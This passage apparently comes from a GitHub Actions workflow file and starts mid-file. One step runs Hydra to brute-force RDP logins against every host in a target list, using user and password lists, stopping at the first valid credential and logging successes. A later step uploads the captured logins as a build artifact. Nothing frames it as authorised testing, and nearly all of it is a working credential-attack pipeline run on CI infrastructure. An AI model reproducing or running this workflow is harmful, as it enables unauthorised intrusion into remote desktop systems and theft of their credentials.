          EOF

      - name: Run Targeted Hydra Attack
        run: |
          # -L for specific users, -P for specific passwords
          # -M for target list from nonla.txt
          # -f stops Hydra after finding the first valid credential for an IP
          hydra -L users.txt -P passwords.txt -M nonla.txt rdp -t 4 -f -vV -o successful_logins.txt || true

      - name: Upload Success Report
        uses: actions/upload-artifact@v4
        with:
          name: successful-logins-report
          path: successful_logins.txt
